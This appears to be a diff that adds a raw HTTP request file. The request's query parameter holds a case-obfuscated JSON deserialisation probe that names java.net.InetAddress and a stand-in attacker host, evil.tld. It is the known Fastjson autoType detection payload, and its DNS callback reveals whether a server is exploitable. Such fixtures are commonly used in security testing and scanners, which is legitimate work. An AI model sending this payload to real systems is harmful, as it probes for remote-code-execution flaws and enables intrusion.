@@ -1,0 +1,4 @@
+GET /a?s={"@tYpE":"jAvA.nEt.InEtAdDrEsS","vAl":"EvIl.TlD"} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
